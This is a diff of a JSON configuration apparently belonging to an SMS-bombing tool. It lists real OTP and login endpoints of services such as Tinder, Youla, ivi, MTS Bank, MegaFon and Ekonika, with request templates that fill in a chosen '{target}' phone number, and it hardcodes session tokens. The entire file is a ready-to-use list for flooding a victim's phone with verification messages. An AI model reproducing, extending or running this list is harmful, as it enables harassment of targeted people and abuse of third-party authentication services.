@@ -1,119 +1,108 @@
 {
-    "contributors": [
-        "TheSpeedX",
-        "Avinash",
-        "Reiltar",
-        "ItzAnasov"
-    ],
-    "version": "2.3.5",
-    "sms": {
-        "multi": [
-            {
-                "name": "qlean",
-                "method": "POST",
-                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
-                "data": {
-                    "phone": "{cc}{target}"
-                },
-                "identifier": "request_id"
-            },
-            {
-                "name": "mailru",
-                "method": "POST",
-                "url": "https://cloud.mail.ru//api/v2/notify/applink",
-                "data": {
-                    "phone": "+{cc}{target}",
-                    "api": "2",
-                    "email": "email",
-                    "x-email": "x-email"
-                },
-                "identifier": "200"
-            },
-            {
-                "name": "tinder",
-                "method": "POST",
-                "url": "https://api.gotinder.com/v2/auth/sms/send",
-                "params": {
-                    "auth_type": "sms",
-                    "locale": "ru"
-                },
-                "data": {
-                    "phone_number": "{cc}{target}"
-                },
-                "identifier": "200"
-            },
-            {
-                "name": "youla",
-                "method": "POST",
-                "url": "https://youla.ru/web-api/auth/request_code",
-                "data": {
-                    "phone": "+{cc}{target}"
-                },
-                "identifier": ":6"
-            },
-            {
-                "name": "ivi",
-                "method": "POST",
-                "url": "https://api2.ivi.ru/mobileapi/user/validate/v5/",
-                "data": {
-                    "value": "{cc}{target}",
-                    "app_version": "870",
-                    "session": "d9e32a7e5392744894738190_1692213201-0fi4hYiRSNlbbMqTCREJdUA",
-                    "session_data": "eyJ1aWQiOjUzOTI3NDQ4OTQ3MzgxOTB9.Y-vdWw.DSOki5z4pZU-ctmYmL0NQwUM504"
-                },
-                "identifier": "true"
-            },
-            {
-                "name": "ivitv",
-                "method": "POST",
-                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/",
-                "data": {
-                    "phone": "{cc}{target}",
-                    "device": "Windows+v.43+Chrome+v.7453451",
-                    "app_version": "870"
-                },
-                "identifier": "true"
-            },
-            {
-                "name": "mts",
-                "method": "POST",
-                "url": "https://sso.mtsbank.ru/api/v2/login",
-                "data": {
-                    "login": "{cc}{target}"
-                },
-                "params": {
-                    "count": 2,
-                    "count_confirm": 3,
-                    "name": "",
-                    "next_step": "sms_confirm",
-                    "sign_policy": false
-                }
-            },
-            {
-                "name": "gid",
-                "method": "GET",
-                "url": "https://auth.gid.ru/api/actions/check_phone/",
-                "data": {
-                    "phone": "{cc}{target}"
-                }
-            },
-            {
-                "name": "megaphone",
-                "method": "POST",
-                "url": "https://lk.megafon.ru/api/auth/otp/request",
-                "data": {
-                    "login": "{cc}{target}"
-                }
-            },
-            {
-                "name": "letu",
-                "method": "POST",
-                "url": "https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU",
-                "data": {
-                    "phoneNumber": "",
-                    "captcha": ""
-                }
-            }
-        ]
-    }
+  "sms": {
+    "multi": [
+      {
+        "name": "tinder",
+        "method": "POST",
+        "url": "https://api.gotinder.com/v2/auth/sms/send",
+        "params": {
+          "auth_type": "sms",
+          "locale": "ru"
+        },
+        "data": {
+          "phone_number": "{cc}{target}"
+        },
+        "path": {
+          "all": "['data']['phone_number']"
+        },
+        "format": "lambda x: f'{x}'",
+        "identifier": "200"
+      },
+      {
+        "name": "youla",
+        "method": "POST",
+        "url": "https://youla.ru/web-api/auth/request_code",
+        "data": {
+          "phone": "+{cc}{target}"
+        },
+        "identifier": ":6"
+      },
+      {
+        "name": "ivi",
+        "method": "POST",
+        "url": "https://api2.ivi.ru/mobileapi/user/validate/v5/",
+        "data": {
+          "value": "{cc}{target}",
+          "app_version": "870",
+          "session": "d9e32a7e5392744894738190_1692213201-0fi4hYiRSNlbbMqTCREJdUA",
+          "session_data": "eyJ1aWQiOjUzOTI3NDQ4OTQ3MzgxOTB9.Y-vdWw.DSOki5z4pZU-ctmYmL0NQwUM504"
+        },
+        "identifier": "true",
+        "path": "[\"data\"][\"value\"]",
+        "format": "lambda x: +{}"
+      },
+      {
+        "name": "ivitv",
+        "method": "POST",
+        "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/",
+        "data": {
+          "phone": "{cc}{target}",
+          "device": "Windows+v.43+Chrome+v.7453451",
+          "app_version": "870"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "mts",
+        "method": "POST",
+        "url": "https://sso.mtsbank.ru/api/v2/login",
+        "data": {
+          "login": "{cc}{target}"
+        },
+        "params": {
+          "count": 2,
+          "count_confirm": 3,
+          "name": "",
+          "next_step": "sms_confirm",
+          "sign_policy": false
+        }
+      },
+      {
+        "name": "gid",
+        "method": "GET",
+        "url": "https://auth.gid.ru/api/actions/check_phone/",
+        "data": {
+          "phone": "{cc}{target}"
+        }
+      },
+      {
+        "name": "megaphone",
+        "method": "POST",
+        "url": "https://lk.megafon.ru/api/auth/otp/request",
+        "data": {
+          "login": "{cc}{target}"
+        }
+      },
+      {
+        "name": "letu",
+        "method": "POST",
+        "url": "https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU",
+        "data": {
+          "phoneNumber": "",
+          "captcha": ""
+        }
+      },
+      {
+        "name": "ekonika",
+        "method": "POST",
+        "url": "https://ekonika.ru/ajax/send_pin.php?site=s1",
+        "data": {
+          "code": "{cc}",
+          "phone": "{target}",
+          "action": "check_phone",
+          "sessid": "9e226e852e15d9ce3d55b314e0c23c2f"
+        }
+      }
+    ]
+  }
 }
